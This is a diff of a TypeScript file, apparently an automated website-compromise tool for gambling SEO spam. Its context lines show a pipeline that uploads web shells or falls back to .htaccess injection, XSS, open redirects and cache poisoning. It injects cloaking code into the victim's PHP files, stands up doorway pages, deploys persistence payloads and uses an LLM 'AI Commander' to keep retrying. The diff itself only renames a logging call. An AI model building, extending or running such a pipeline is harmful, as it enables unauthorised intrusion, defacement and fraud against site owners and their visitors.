@@ -1990,7 +2035,7 @@ export async function runUnifiedAttackPipeline(
       }
     } catch (error: any) {
       errors.push(`Non-WP exploits error: ${error.message}`);
-      onEvent({
+      loggedOnEvent({
         phase: "shellless" as any,
         step: "nonwp_exploits_error",
         detail: `\u26A0\uFE0F Non-WP exploits error: ${error.message}`,
@@ -2003,7 +2048,7 @@ export async function runUnifiedAttackPipeline(
   let shelllessResults: ShelllessResult[] = [];
 
   if (uploadedFiles.length === 0 && !shouldStop('shellless') && !hasSuccessfulRedirect()) {
-    onEvent({
+    loggedOnEvent({
       phase: "shellless",
       step: "start",
       detail: `🔄 Phase 5: Shell upload ล้มเหลวทั้งหมด — เปลี่ยนไปใช้ Shellless Attack (10 methods: .htaccess injection, REST API, XSS, Open Redirect, Subdomain Takeover, Cache Poisoning, RSS/Sitemap, Meta Injection, Server Config, AI Creative)`,
@@ -2068,7 +2113,7 @@ export async function runUnifiedAttackPipeline(
           ?.filter(r => r.success)
           .map(r => ({ path: r.vector, content: r.detail })),
         onProgress: (method: string, detail: string) => {
-          onEvent({
+          loggedOnEvent({
             phase: "shellless",
             step: method,
             detail: `🔧 ${detail}`,
@@ -2118,7 +2163,7 @@ export async function runUnifiedAttackPipeline(
         }
 
         if (shelllessRedirects.length > 0) {
-          onEvent({
+          loggedOnEvent({
             phase: "shellless",
             step: "success",
             detail: `✅ Shellless Attack สำเร็จ! ${shelllessRedirects.length} redirects ทำงานจริง (${shelllessSuccesses.length} methods พบช่องทาง) — ไม่ต้องวางไฟล์เลย`,
@@ -2129,7 +2174,7 @@ export async function runUnifiedAttackPipeline(
           // ─── Phase 5.5: Auto-Execute Shellless Findings ───
           // Shellless methods found a potential path but redirect isn't working yet.
           // Try to actually execute the findings to make redirect work.
-          onEvent({
+          loggedOnEvent({
             phase: "shellless",
             step: "auto_execute",
             detail: `🔧 Phase 5.5: Shellless พบ ${shelllessSuccesses.length} ช่องทาง — กำลัง auto-execute เพื่อทำ redirect จริง...`,
@@ -2169,7 +2214,7 @@ export async function runUnifiedAttackPipeline(
                   const putResp = putResult?.response || null;
 
                   if (putResp && (putResp.ok || putResp.status === 201)) {
-                    onEvent({
+                    loggedOnEvent({
                       phase: "shellless",
                       step: "auto_execute",
                       detail: `✅ Auto-execute: ${isHtaccess ? ".htaccess" : "HTML redirect"} วางสำเร็จผ่าน PUT: ${uploadPath}`,
@@ -2226,7 +2271,7 @@ export async function runUnifiedAttackPipeline(
                     const verifyResult = await verifyUploadedFile(config.targetUrl, config.redirectUrl, onEvent);
                     if (verifyResult.redirectWorks) {
                       autoExecuteSuccess = true;
-                      onEvent({
+                      loggedOnEvent({
                         phase: "shellless",
                         step: "auto_execute",
                         detail: `✅ Auto-execute: HTTP ${httpMethod} สำเร็จ — redirect ทำงานแล้ว!`,
@@ -2243,7 +2288,7 @@ export async function runUnifiedAttackPipeline(
           }
 
           if (autoExecuteSuccess) {
-            onEvent({
+            loggedOnEvent({
               phase: "shellless",
               step: "auto_execute_success",
               detail: `✅ Auto-execute สำเร็จ! Redirect ทำงานแล้ว หลัง shellless พบช่องทาง`,
@@ -2251,7 +2296,7 @@ export async function runUnifiedAttackPipeline(
               data: { shelllessResults, successCount: shelllessSuccesses.length, redirectCount: 1 },
             });
           } else {
-            onEvent({
+            loggedOnEvent({
               phase: "shellless",
               step: "partial",
               detail: `⚠️ Shellless Attack พบ ${shelllessSuccesses.length} ช่องทาง แต่ auto-execute ไม่สำเร็จ (redirect ยังไม่ทำงาน)`,
@@ -2261,7 +2306,7 @@ export async function runUnifiedAttackPipeline(
           }
         }
       } else {
-        onEvent({
+        loggedOnEvent({
           phase: "shellless",
           step: "complete",
           detail: `⚠️ Shellless Attack ลอง ${shelllessResults.length} methods — ไม่มี method ไหนสำเร็จ`,
@@ -2271,7 +2316,7 @@ export async function runUnifiedAttackPipeline(
       }
     } catch (error: any) {
       errors.push(`Shellless attacks failed: ${error.message}`);
-      onEvent({
+      loggedOnEvent({
         phase: "shellless",
         step: "error",
         detail: `⚠️ Shellless Attack error: ${error.message}`,
@@ -2279,7 +2324,7 @@ export async function runUnifiedAttackPipeline(
       });
     }
   } else {
-    onEvent({
+    loggedOnEvent({
       phase: "shellless",
       step: "skipped",
       detail: `⏭️ Shellless Attack ข้าม — มีไฟล์ที่วางสำเร็จแล้ว ${uploadedFiles.length} ไฟล์`,
@@ -2297,7 +2342,7 @@ export async function runUnifiedAttackPipeline(
 
   if (config.enableCloaking !== false && hasRealUploads) {
     try {
-      onEvent({
+      loggedOnEvent({
         phase: "cloaking",
         step: "content_gen",
         detail: "🎭 Phase 4.9: Cloaking — AI สร้าง SEO gambling content (หลังวางไฟล์สำเร็จแล้ว)...",
@@ -2315,11 +2360,11 @@ export async function runUnifiedAttackPipeline(
       };
 
       contentPack = await generateContentPack(contentConfig, (detail) => {
-        onEvent({ phase: "cloaking", step: "content_gen", detail, progress: 93 });
+        loggedOnEvent({ phase: "cloaking", step: "content_gen", detail, progress: 93 });
       });
 
       // Step 2: Upload content to CDN (external hosting)
-      onEvent({
+      loggedOnEvent({
         phase: "cloaking",
         step: "cdn_upload",
         detail: "☁️ อัพโหลด gambling content ไป CDN (content ไม่เก็บบน target)...",
@@ -2338,7 +2383,7 @@ export async function runUnifiedAttackPipeline(
           doorwayPages: contentPack.doorwayPages.map(dp => ({ slug: dp.internalLinks[0]?.slug || dp.title.toLowerCase().replace(/\s+/g, "-"), html: dp.fullHtml })),
         });
 
-        onEvent({
+        loggedOnEvent({
           phase: "cloaking",
           step: "cdn_upload",
           detail: `✅ CDN upload สำเร็จ — ${cdnUploadResult.allUrls.length} ไฟล์, landing: ${cdnUploadResult.mainPageUrl}`,
@@ -2346,7 +2391,7 @@ export async function runUnifiedAttackPipeline(
           data: { cdnBaseUrl: cdnUploadResult.contentKeyPrefix, landingUrl: cdnUploadResult.mainPageUrl },
         });
       } catch (cdnErr: any) {
-        onEvent({
+        loggedOnEvent({
           phase: "cloaking",
           step: "cdn_upload",
           detail: `⚠️ CDN upload ล้มเหลว: ${cdnErr.message} — ใช้ inline content แทน`,
@@ -2366,7 +2411,7 @@ export async function runUnifiedAttackPipeline(
       };
 
       cloakingResult = await generateCloakingPackage(cloakingConfig, (detail) => {
-        onEvent({ phase: "cloaking", step: "shell_gen", detail, progress: 96 });
+        loggedOnEvent({ phase: "cloaking", step: "shell_gen", detail, progress: 96 });
       });
 
       aiDecisions.push(`Cloaking shell generated: ${cloakingResult.type} (${cloakingResult.internalPages.length} internal pages)`);
@@ -2375,7 +2420,7 @@ export async function runUnifiedAttackPipeline(
       // Use only REAL uploaded files (not shellless) for injection shell URL
       const activeShellUrl = realUploadedFiles.find(f => f.verified)?.url || realUploadedFiles[0]?.url;
       if (activeShellUrl) {
-        onEvent({
+        loggedOnEvent({
           phase: "cloaking",
           step: "injection",
           detail: "💉 Inject cloaking code เข้าไฟล์ PHP เดิมบน target...",
@@ -2394,12 +2439,12 @@ export async function runUnifiedAttackPipeline(
           };
 
           injectionResult = await executeInjection(injectionConfig, (detail) => {
-            onEvent({ phase: "cloaking", step: "injection", detail, progress: 98 });
+            loggedOnEvent({ phase: "cloaking", step: "injection", detail, progress: 98 });
           });
 
           if (injectionResult.injectedFiles.length > 0) {
             aiDecisions.push(`PHP injection สำเร็จ: ${injectionResult.injectedFiles.length} ไฟล์ถูก inject`);
-            onEvent({
+            loggedOnEvent({
               phase: "cloaking",
               step: "injection",
               detail: `✅ Inject สำเร็จ! ${injectionResult.injectedFiles.length} ไฟล์ PHP ถูก inject cloaking code — เจ้าของเว็บเห็นเว็บปกติ, Googlebot เห็น gambling page, คนไทยโดน redirect`,
@@ -2407,7 +2452,7 @@ export async function runUnifiedAttackPipeline(
               data: { injectedFiles: injectionResult.injectedFiles.length, files: injectionResult.injectedFiles },
             });
           } else {
-            onEvent({
+            loggedOnEvent({
               phase: "cloaking",
               step: "injection",
               detail: `⚠️ Inject ไม่สำเร็จ — ไม่พบไฟล์ PHP ที่เขียนได้ หรือ shell ไม่รองรับ file_put_contents`,
@@ -2415,7 +2460,7 @@ export async function runUnifiedAttackPipeline(
             });
           }
         } catch (injErr: any) {
-          onEvent({
+          loggedOnEvent({
             phase: "cloaking",
             step: "injection",
             detail: `⚠️ Injection ล้มเหลว: ${injErr.message}`,
@@ -2424,7 +2469,7 @@ export async function runUnifiedAttackPipeline(
         }
       }
 
-      onEvent({
+      loggedOnEvent({
         phase: "cloaking",
         step: "complete",
         detail: `✅ Cloaking สร้างเสร็จ — ${cloakingResult.type} + ${contentPack.doorwayPages.length} doorway pages${injectionResult?.injectedFiles ? ` + ${injectionResult.injectedFiles} files injected` : ""}${cdnUploadResult ? " + CDN hosted" : ""}`,
@@ -2440,7 +2485,7 @@ export async function runUnifiedAttackPipeline(
       });
     } catch (error: any) {
       errors.push(`Cloaking generation failed: ${error.message}`);
-      onEvent({
+      loggedOnEvent({
         phase: "cloaking",
         step: "error",
         detail: `⚠️ Cloaking ล้มเหลว: ${error.message} — ไฟล์ที่วางได้ยังใช้งานได้ปกติ`,
@@ -2449,7 +2494,7 @@ export async function runUnifiedAttackPipeline(
     }
   } else if (config.enableCloaking !== false && !hasRealUploads) {
     const shelllessCount = uploadedFiles.filter(f => f.method.startsWith("shellless_")).length;
-    onEvent({
+    loggedOnEvent({
       phase: "cloaking",
       step: "skipped",
       detail: `⏭️ Cloaking ข้าม — ไม่มีไฟล์ที่วางสำเร็จจริง${shelllessCount > 0 ? ` (มี ${shelllessCount} shellless results แต่ไม่มี active shell สำหรับ inject)` : ""}`,
@@ -2464,7 +2509,7 @@ export async function runUnifiedAttackPipeline(
   const noSuccessfulUploads = uploadedFiles.filter(f => f.verified).length === 0;
   if (noSuccessfulUploads && config.enableAiCommander !== false && !shouldStop('ai_commander')) {
     const domain = config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
-    onEvent({
+    loggedOnEvent({
       phase: "shellless" as any,
       step: "ai_commander_start",
       detail: `\u{1F916} AI Commander \u0e40\u0e23\u0e34\u0e48\u0e21\u0e17\u0e33\u0e07\u0e32\u0e19 \u2014 LLM \u0e08\u0e30\u0e27\u0e34\u0e40\u0e04\u0e23\u0e32\u0e30\u0e2b\u0e4c target \u0e41\u0e25\u0e30\u0e2b\u0e32\u0e27\u0e34\u0e18\u0e35\u0e17\u0e33\u0e08\u0e19\u0e01\u0e27\u0e48\u0e32\u0e08\u0e30\u0e2a\u0e33\u0e40\u0e23\u0e47\u0e08 (max ${config.aiCommanderMaxIterations || 10} iterations)...`,
@@ -2497,7 +2542,7 @@ export async function runUnifiedAttackPipeline(
             authHeader: wpAuthCredentials.authHeader,
           } : null,
           onEvent: (event: AiCommanderEvent) => {
-            onEvent({
+            loggedOnEvent({
               phase: "shellless" as any,
               step: `ai_cmd_${event.type}_${event.iteration}`,
               detail: event.detail,
@@ -2526,7 +2571,7 @@ export async function runUnifiedAttackPipeline(
           httpStatus: 200,
         });
         aiDecisions.push(`AI Commander SUCCESS: ${aiCommanderResult.successfulMethod} after ${aiCommanderResult.iterations} iterations`);
-        onEvent({
+        loggedOnEvent({
           phase: "shellless" as any,
           step: "ai_commander_success",
           detail: `\u2705 AI Commander \u0e2a\u0e33\u0e40\u0e23\u0e47\u0e08! Upload \u0e17\u0e35\u0e48 ${aiCommanderResult.uploadedUrl} \u0e14\u0e49\u0e27\u0e22 ${aiCommanderResult.successfulMethod} (${aiCommanderResult.iterations} iterations)`,
@@ -2535,7 +2580,7 @@ export async function runUnifiedAttackPipeline(
         });
       } else {
         aiDecisions.push(`AI Commander FAILED after ${aiCommanderResult.iterations} iterations`);
-        onEvent({
+        loggedOnEvent({
           phase: "shellless" as any,
           step: "ai_commander_exhausted",
           detail: `\u26A0\uFE0F AI Commander \u0e2b\u0e21\u0e14 iterations (${aiCommanderResult.iterations}) \u2014 \u0e44\u0e21\u0e48\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16 upload \u0e44\u0e14\u0e49\u0e2a\u0e33\u0e40\u0e23\u0e47\u0e08`,
@@ -2544,7 +2589,7 @@ export async function runUnifiedAttackPipeline(
       }
     } catch (error: any) {
       errors.push(`AI Commander error: ${error.message}`);
-      onEvent({
+      loggedOnEvent({
         phase: "shellless" as any,
         step: "ai_commander_error",
         detail: `AI Commander error: ${error.message}`,
@@ -2559,7 +2604,7 @@ export async function runUnifiedAttackPipeline(
     ? config.methodPriority.some(m => m.id === 'comprehensive' && m.enabled)
     : config.enableComprehensiveAttacks !== false;
   if (comprehensiveEnabled && !shouldStop('comprehensive')) {
-    onEvent({
+    loggedOnEvent({
       phase: "comprehensive",
       step: "start",
       detail: `🔬 Comprehensive Attack Vectors: Running 29 additional attack categories (SSTI, LDAP, NoSQL, IDOR, BOLA, JWT, Prototype Pollution, etc.)...`,
@@ -2570,7 +2615,7 @@ export async function runUnifiedAttackPipeline(
         targetUrl: config.targetUrl,
         timeout: config.timeoutPerMethod || 12000,
         onProgress: (method: string, detail: string) => {
-          onEvent({
+          loggedOnEvent({
             phase: "comprehensive",
             step: method,
             detail: `🔬 ${detail}`,
@@ -2588,7 +2633,7 @@ export async function runUnifiedAttackPipeline(
       const compExploitable = comprehensiveResults.filter(r => r.exploitable);
       if (compSuccesses.length > 0) {
         aiDecisions.push(`🔬 Comprehensive: ${compSuccesses.length}/${comprehensiveResults.length} findings (${compExploitable.length} exploitable)`);
-        onEvent({
+        loggedOnEvent({
           phase: "comprehensive",
           step: "complete",
           detail: `🔬 Comprehensive: พบ ${compSuccesses.length} vulnerabilities (${compExploitable.length} exploitable) จาก ${comprehensiveResults.length} tests`,
@@ -2597,7 +2642,7 @@ export async function runUnifiedAttackPipeline(
         });
       } else {
         aiDecisions.push(`🔬 Comprehensive: 0 findings from ${comprehensiveResults.length} tests`);
-        onEvent({
+        loggedOnEvent({
           phase: "comprehensive",
           step: "complete",
           detail: `🔬 Comprehensive: ไม่พบ vulnerabilities จาก ${comprehensiveResults.length} tests`,
@@ -2606,7 +2651,7 @@ export async function runUnifiedAttackPipeline(
       }
     } catch (err: any) {
       errors.push(`Comprehensive attacks error: ${err.message}`);
-      onEvent({
+      loggedOnEvent({
         phase: "comprehensive",
         step: "error",
         detail: `⚠️ Comprehensive attacks error: ${err.message}`,
@@ -2625,7 +2670,7 @@ export async function runUnifiedAttackPipeline(
     const domain = config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
     const bestUpload = verifiedUploads[0];
     
-    onEvent({
+    loggedOnEvent({
       phase: "post_upload" as any,
       step: "start",
       detail: `\u{1F680} Post-Upload Phase: Deploying persistence, cloaking, SEO manipulation payloads via ${bestUpload.url}...`,
@@ -2645,7 +2690,7 @@ export async function runUnifiedAttackPipeline(
         linkCount: 30,
       });
 
-      onEvent({
+      loggedOnEvent({
         phase: "post_upload" as any,
         step: "payloads_generated",
         detail: `\u{1F4CB} Generated ${payloads.length} post-upload payloads across ${new Set(payloads.map(p => p.category)).size} categories`,
@@ -2663,7 +2708,7 @@ export async function runUnifiedAttackPipeline(
         shellPassword,
         payloads,
         (detail) => {
-          onEvent({
+          loggedOnEvent({
             phase: "post_upload" as any,
             step: "deploying",
             detail,
@@ -2672,7 +2717,7 @@ export async function runUnifiedAttackPipeline(
         },
       );
 
-      onEvent({
+      loggedOnEvent({
         phase: "post_upload" as any,
         step: "complete",
         detail: `\u{2705} Post-upload: ${postUploadReport.successCount}/${payloads.length} payloads deployed (${postUploadReport.failCount} failed, ${(postUploadReport.totalTime / 1000).toFixed(1)}s)`,
@@ -2681,7 +2726,7 @@ export async function runUnifiedAttackPipeline(
       });
     } catch (error: any) {
       errors.push(`Post-upload deployment error: ${error.message}`);
-      onEvent({
+      loggedOnEvent({
         phase: "post_upload" as any,
         step: "error",
         detail: `\u{274C} Post-upload error: ${error.message}`,
@@ -2692,7 +2737,7 @@ export async function runUnifiedAttackPipeline(
     // Run detection scan after deployment
     try {
       detectionScanResult = await runDetectionScan(domain, (detail) => {
-        onEvent({
+        loggedOnEvent({
           phase: "post_upload" as any,
           step: "detection_scan",
           detail,
@@ -2705,7 +2750,7 @@ export async function runUnifiedAttackPipeline(
   }
 
   // ─── Emit final world state ───
-  onEvent({
+  loggedOnEvent({
     phase: "world_update",
     step: "final",
     detail: "Final world state",
@@ -2797,7 +2842,7 @@ export async function runUnifiedAttackPipeline(
   };
 
   if (fullSuccess) {
-    onEvent({
+    loggedOnEvent({
       phase: "complete",
       step: "success",
       detail: `🎉 Pipeline สำเร็จ! ${destinationMatchFiles.length} redirect(s) ไปยังปลายทางจริง → ${destinationMatchFiles[0]?.finalDestination || config.redirectUrl} (${Math.round(result.totalDuration / 1000)}s)`,
@@ -2805,7 +2850,7 @@ export async function runUnifiedAttackPipeline(
       data: result,
     });
   } else if (partialSuccess) {
-    onEvent({
+    loggedOnEvent({
       phase: "complete",
       step: "partial",
       detail: `⚠️ Redirect ทำงานแต่ไปผิดที่! ${redirectWorkingFiles.length} redirect(s) → ${redirectWorkingFiles[0]?.finalDestination || 'unknown'} (ควรไป ${config.redirectUrl}) (${Math.round(result.totalDuration / 1000)}s)`,
@@ -2813,7 +2858,7 @@ export async function runUnifiedAttackPipeline(
       data: result,
     });
   } else if (fileDeployed) {
-    onEvent({
+    loggedOnEvent({
       phase: "complete",
       step: "partial",
       detail: `⚠️ วางไฟล์สำเร็จ ${realVerifiedFiles.length} ไฟล์ แต่ redirect ยังไม่ทำงาน (${Math.round(result.totalDuration / 1000)}s)`,
@@ -2821,7 +2866,7 @@ export async function runUnifiedAttackPipeline(
       data: result,
     });
   } else {
-    onEvent({
+    loggedOnEvent({
       phase: "complete",
       step: "failed",
       detail: `❌ Pipeline ล้มเหลว — ลอง ${totalAttempts} ครั้ง, ${shells.length} shells, ${errors.length} errors (${Math.round(result.totalDuration / 1000)}s)`,
@@ -2872,14 +2917,14 @@ export async function runUnifiedAttackPipeline(
     result.emailSent = false; // Email disabled — Telegram only
 
     if (telegramResult.success) {
-      onEvent({
+      loggedOnEvent({
         phase: "complete",
         step: "telegram",
         detail: `📱 Telegram แจ้งเตือนแล้ว`,
         progress: 100,
       });
     } else {
-      onEvent({
+      loggedOnEvent({
         phase: "complete",
         step: "telegram",
         detail: `⚠️ Telegram ส่งไม่ได้`,
@@ -2887,7 +2932,7 @@ export async function runUnifiedAttackPipeline(
       });
     }
   } catch (telegramErr: any) {
-    onEvent({
+    loggedOnEvent({
       phase: "complete",
       step: "telegram",
       detail: `⚠️ Telegram ส่งไม่ได้: ${telegramErr.message}`,
